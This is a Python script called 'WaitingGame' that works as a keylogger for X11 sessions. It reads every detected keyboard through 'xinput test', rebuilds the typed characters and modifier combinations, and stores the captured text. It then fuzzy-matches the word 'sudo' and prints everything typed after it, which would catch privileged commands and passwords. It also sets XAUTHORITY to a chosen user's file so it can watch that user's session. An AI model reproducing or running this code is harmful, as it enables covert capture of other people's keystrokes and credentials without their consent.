import subprocess
import re
import threading
import os
# pyrefly: ignore[missing-import]
from rapidfuzz import fuzz, process

# Define a function that monitors keyboard events for a specific input device.
# device_id represents the ID of the keyboard provided by xinput.
def monitor_keyboard(device_id):

    # Start the xinput test command to listen for keyboard events.
    # stdout=subprocess.PIPE captures the command's output.
    # stderr=subprocess.STDOUT redirects error messages to stdout.
    # text=True returns output as strings instead of bytes.
    # bufsize=1 enables line-buffered output.
    # env=os.environ.copy() passes the current environment variables.
    process = subprocess.Popen(
        ["xinput", "test", str(device_id)],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        env=os.environ.copy()
    )

    # Create an empty dictionary to store keyboard key mappings.
    # The keycode will be the dictionary key.
    # The corresponding key symbols will be stored as a list.
    keymap = {}

    # Execute xmodmap -pke to retrieve the current keyboard mapping.
    # This command returns the keycodes and their associated key symbols.
    key_data = subprocess.check_output(
        ["xmodmap", "-pke"],
        text=True,
        env=os.environ.copy()
    )

    # Iterate through every line returned by xmodmap.
    for mapping in key_data.splitlines():

        # Match lines containing a keycode and its associated key symbols.
        # Example: keycode 38 = a A a A
        match = re.match(r"keycode\s+(\d+)\s*=\s*(.*)", mapping)

        # If the line matches the expected format, extract its information.
        if match:

            # Store the keycode as the dictionary key.
            # Store the associated key symbols as a list of strings.
            keymap[match.group(1)] = match.group(2).split()

    # Create a set to track currently pressed modifier keys.
    # A set prevents duplicate modifier entries.
    modifiers = set()

    # Define a dictionary that associates X11 modifier key symbols
    # with their human-readable names.
    modifier_map = {
        "Control_L": "CTRL",           # Left Control key.
        "Control_R": "CTRL",           # Right Control key.
        "Alt_L": "ALT",                # Left Alt key.
        "Alt_R": "ALT",                # Right Alt key.
        "ISO_Level3_Shift": "ALT GR",  # AltGr key.
        "Shift_L": "SHIFT",            # Left Shift key.
        "Shift_R": "SHIFT",            # Right Shift key.
        "Super_L": "SUPER",            # Left Super key.
        "Super_R": "SUPER"             # Right Super key.
    }

    # Continuously read keyboard events from the xinput process.
    for line in process.stdout:

        # Search for keyboard press or release events.
        # Example: key press 38
        # Example: key release 38
        match = re.search(r"key (press|release)\s+(\d+)", line)

        # Ignore lines that do not contain a valid keyboard event.
        if not match:
            continue

        # Extract the event type and the corresponding keycode.
        event, keycode = match.groups()

        # Retrieve the key symbols associated with the extracted keycode.
        keysyms = keymap.get(keycode, [])

        # Ignore keycodes that do not have an associated mapping.
        if not keysyms:
            continue

        # Get the first key symbol associated with this keycode.
        # This is normally the unmodified key representation.
        key_name = keysyms[0]

        # Handle modifier keys separately.
        if key_name in modifier_map:

            # Convert the modifier key symbol into its readable name.
            modifier = modifier_map[key_name]

            # If the modifier was pressed, add it to the active modifiers set.
            if event == "press":
                modifiers.add(modifier)

            # If the modifier was released, remove it from the active set.
            else:
                modifiers.discard(modifier)

            # Skip normal character processing for modifier keys.
            continue

        # Ignore key release events.
        # Only key press events should generate output.
        if event != "press":
            continue

        # Initialize the key symbol index.
        # Index 0 normally represents the unmodified key.
        index = 0

        # If Shift is currently pressed, select the shifted key symbol.
        if "SHIFT" in modifiers:
            index += 1

        # If AltGr is currently pressed, select the AltGr key symbol.
        if "ALT GR" in modifiers:
            index += 2

        # Check whether the calculated index exists in the key symbol list.
        if index < len(keysyms):

            # Retrieve the key symbol corresponding to the active modifiers.
            character = keysyms[index]

        else:

            # Fall back to the first key symbol if the index is unavailable.
            character = keysyms[0]

        # Check whether the key symbol is represented as a hexadecimal value.
        if character.startswith("0x"):

            # Attempt to convert the hexadecimal value into a Unicode character.
            try:
                character = chr(int(character, 16))

            # Ignore the conversion if the hexadecimal value is invalid.
            except ValueError:
                pass

        # Create a sorted list containing the currently active modifiers.
        # Sorting ensures a consistent output order.
        combination = sorted(modifiers)

        # If one or more modifiers are active, combine them with the character.
        if combination:

            # Format the combination as CTRL + SHIFT + a, for example.
            log = " + ".join(combination + [character])

        else:

            # If no modifiers are active, output only the character.
            log = character

        # Print the detected key or combination.
        # flush=True forces immediate output instead of waiting for buffering.
        #print(log, flush=True)
        capture = ""
        
        # Initialize the capture variable as an empty string.
        capture = getattr(monitor_keyboard, "capture", "")

        # Append the newly detected key to the captured text.
        capture += log

        # Save the updated captured text.
        monitor_keyboard.capture = capture

        capture = re.sub("space", " ", capture, flags=re.IGNORECASE)

        def extract_phrase(capture, keyword="sudo", threshold=85):
            words = capture.split()
        
            for i, word in enumerate(words):
                candidate = word.strip(".,:;!?")
        
                if fuzz.ratio(candidate.lower(), keyword.lower()) >= threshold:
                    return " ".join(words[i:])
        
            return None

            return capture[match.start():]


        
        result = extract_phrase(capture)

        if result is not None:
            result = re.sub("Return", " ", result, flags=re.IGNORECASE)
            print("\033[91m" + result + "\033[0m", flush=True)




# Define the main function.
# This function configures the X11 environment, detects keyboards,
# and starts a monitoring thread for each detected keyboard.
def main():

    # Set the X11 display to display number 0.
    # This allows the script to communicate with the graphical session.
    os.environ["DISPLAY"] = ":0"

    # Set the path to the X11 authentication file.
    # Replace USER with the appropriate system username.
    os.environ["XAUTHORITY"] = "/home/USER/.Xauthority"

    # Execute xinput list --short to retrieve all available input devices.
    # text=True returns the command output as a string.
    output = subprocess.check_output(
        ["xinput", "list", "--short"],
        text=True
    )

    # Extract device names and IDs using a regular expression.
    # The expression supports device entries with or without the arrow symbol.
    devices = re.findall(
        r"^\s*[↳]?\s*(.+?)\s+id=(\d+).*",
        output,
        re.MULTILINE
    )

    # Create an empty list to store detected keyboard devices.
    keyboards = []

    # Iterate through the detected device names and IDs.
    for name, device_id in devices:

        # Check whether the device name contains "keyboard" or "kbd".
        # Convert the name to lowercase to make the comparison case-insensitive.
        if any(word in name.lower() for word in ["keyboard", "kbd"]):

            # Add matching keyboard devices to the keyboards list.
            keyboards.append((name, device_id))

    # Extract only the device IDs from the detected keyboards.
    keyboard_ids = [
        device_id for name, device_id in keyboards
    ]

    # Display the program name.
    print("=== WaitingGame ===")

    # Display a heading for the detected keyboards.
    print("\nDetected keyboards:")

    # Display the name and ID of every detected keyboard.
    for name, device_id in keyboards:
        print(f"[{device_id}] {name}")

    # Display the list of keyboard IDs.
    print("\nKeyboard IDs:", keyboard_ids)

    # Display a message indicating that keyboard monitoring is starting.
    print("\nMonitoring keyboard events...\n")

    # Start one monitoring thread for each detected keyboard.
    for device_id in keyboard_ids:

        # Create and start a new thread.
        # target specifies the function executed by the thread.
        # args passes the keyboard ID to the monitoring function.
        # daemon=True allows the thread to terminate when the main program exits.
        threading.Thread(
            target=monitor_keyboard,
            args=(device_id,),
            daemon=True
        ).start()

    # Keep the main thread running indefinitely.
    # This prevents the program from exiting while keyboard threads are active.
    threading.Event().wait()


# Check whether this Python file is being executed directly.
# This prevents main() from running automatically when the file is imported.
if __name__ == "__main__":

    # Attempt to execute the main function.
    try:
        main()

    # Catch Ctrl+C (KeyboardInterrupt) to stop the program gracefully.
    except KeyboardInterrupt:

        # Display a message indicating that monitoring has stopped.
        print("\nStopped.")